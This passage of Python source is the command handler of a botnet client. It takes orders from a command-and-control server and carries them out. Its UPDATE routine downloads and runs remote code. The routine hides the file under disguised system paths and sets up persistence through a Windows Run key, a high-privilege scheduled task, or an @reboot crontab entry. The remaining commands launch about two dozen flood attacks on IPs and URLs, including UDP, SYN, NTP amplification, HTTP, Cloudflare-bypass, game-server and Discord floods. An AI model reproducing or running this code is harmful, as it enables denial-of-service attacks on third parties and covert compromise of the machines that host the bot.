                    def wrapped():
                        while not stop_attack.is_set():
                            func(*fargs)
                            break
                    return wrapped

                # UPDATE logic with root check and GitHub support
                if command == 'UPDATE':
                    if len(args) < 3:  # Need both URL and root token
                        continue
                        
                    update_url = args[1]
                    root_token = args[2]
                    
                    # Verify root token (should match C2 server's root token)
                    ROOT_TOKEN = "fsociety_root_9x7"  # This should match C2 server
                    if root_token != ROOT_TOKEN:
                        continue  # Silently ignore non-root update attempts
                        
                    try:
                        # Save update URL for retry on next startup if immediate update fails
                        pending_file = os.path.join(os.environ.get('TEMP', '/tmp'), 'fsociety_pending_update.txt')
                        with open(pending_file, 'w') as f:
                            f.write(update_url)
                            
                        # Get current installation path
                        if IS_WINDOWS:
                            install_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "SystemServices")
                            target_name = os.path.basename(os.path.abspath(__file__))
                        else:
                            home = os.path.expanduser("~")
                            install_dir = os.path.join(home, ".cache", "systemd")
                            target_name = "system-helper.py"
                            
                        if not os.path.exists(install_dir):
                            os.makedirs(install_dir)
                            
                        target_path = os.path.join(install_dir, target_name)
                        
                        # Download and verify update
                        temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), f'bot_update_{random.randint(1000,9999)}.py')
                        r = requests.get(update_url, timeout=30)
                        
                        # Basic validation of downloaded content
                        if not r.content or len(r.content) < 1000:  # Minimum size check
                            raise ValueError("Invalid update content")
                            
                        if not r.content.decode('utf-8', errors='ignore').strip().startswith('#'):
                            raise ValueError("Invalid Python file format")
                            
                        # Save and install update
                        with open(temp_path, 'wb') as f:
                            f.write(r.content)
                            
                        # Copy to target location
                        shutil.copyfile(temp_path, target_path)
                        
                        if IS_WINDOWS:
                            # Hide the file on Windows
                            ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
                            
                            # Update registry and task scheduler
                            pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
                            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                            winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, f'"{pythonw}" "{target_path}"')
                            winreg.CloseKey(reg_key)
                            
                            subprocess.run([
                                "schtasks", "/create", "/tn", "SystemService",
                                "/tr", f'"{pythonw}" "{target_path}"',
                                "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"
                            ], creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
                        else:
                            # Set permissions on Linux
                            os.chmod(target_path, 0o755)
                            
                            # Update crontab
                            cron_cmd = f"@reboot python3 {target_path}\n"
                            try:
                                current_crontab = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
                                if target_path not in current_crontab:
                                    new_crontab = current_crontab.strip() + "\n" + cron_cmd
                                    subprocess.run(["crontab", "-"], input=new_crontab, text=True)
                            except:
                                subprocess.run(["crontab", "-"], input=cron_cmd, text=True)
                                
                        # Remove pending update file after successful install
                        os.remove(pending_file)
                        
                        # Launch updated version
                        if IS_WINDOWS:
                            subprocess.Popen([pythonw, target_path], creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
                        else:
                            subprocess.Popen(["python3", target_path], 
                                        start_new_session=True,
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
                        sys.exit(0)
                    except Exception as e:
                        pass  # Update URL remains saved for retry on next startup
                if command == '.DGB':
                    ip = args[1]
                    timer = args[2]
                    t = threading.Thread(target=attack_wrapper(dgb_attack, ip, timer), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.STRESS':
                    ip = args[1]
                    timer = args[2]
                    t = threading.Thread(target=attack_wrapper(stress_attack, ip, timer), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.CFBYPASSV2':
                    target = args[1]
                    duration = int(args[2])
                    threads = int(args[3]) if len(args) > 3 else 10
                    t = threading.Thread(target=attack_wrapper(cfbypassv2_attack, target, duration, threads), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_udp, ip, port, secs, size), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_tcp, ip, port, secs, size), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.NTP':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(NTP, ip, port, timer), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.MEM':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(MEM, ip, port, timer), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.ICMP':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(icmp, ip, timer), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.POD':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(pod, ip, timer), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_tup, ip, port, secs, size), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_hex, ip, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.ROBLOX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_roblox, ip, port, secs, size), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_vse, ip, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(threads):
                        t1 = threading.Thread(target=attack_wrapper(attack_junk, ip, port, secs), daemon=True)
                        t2 = threading.Thread(target=attack_wrapper(attack_udp, ip, port, secs, size), daemon=True)
                        t3 = threading.Thread(target=attack_wrapper(attack_tcp, ip, port, secs, size), daemon=True)
                        current_attack_threads.extend([t1, t2, t3])
                        t1.start()
                        t2.start()
                        t3.start()
                elif command == '.SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_SYN, ip, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == ".HTTPSTORM":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(STORM_attack, url, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == ".HTTPGET":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(GET_attack, url, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == ".HTTPCFB":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(CFB, url, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == ".HTTPIO":
                    url = args[1]
                    secs = int(args[2])
                    threads = int(args[3])
                    attackType = args[4]
                    t = threading.Thread(target=attack_wrapper(httpio, url, secs, threads, attackType), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == ".HTTPSPOOF":
                    url = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(httpSpoofAttack, url, timer), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == '.MINECRAFT':
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    t = threading.Thread(target=attack_wrapper(attack_minecraft, ip, port, secs), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.FIVEM':
                    cfx_url = args[1]
                    secs = args[2]
                    t = threading.Thread(target=attack_wrapper(attack_fivem, cfx_url, secs), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.DNS':
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    t = threading.Thread(target=attack_wrapper(attack_dns, ip, port, secs), daemon=True)
                    current_attack_threads.append(t)
                    t.start()
                elif command == '.DISCORD':
                    ip = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = 10  # Default number of threads for Discord attack
                    for _ in range(threads):
                        t = threading.Thread(target=attack_wrapper(attack_discord, ip, port, secs), daemon=True)
                        current_attack_threads.append(t)
                        t.start()
                elif command == 'PING':
                    c2.send('PONG'.encode())
        except Exception as e:
            if c2:
                cleanup_socket(c2)
            time.sleep(RECONNECT_INTERVAL)  # Wait before retrying
        
if __name__ == '__main__':
    while True:
        try:
            main()
        except Exception:
            time.sleep(RECONNECT_INTERVAL)  # Wait before restarting main loop
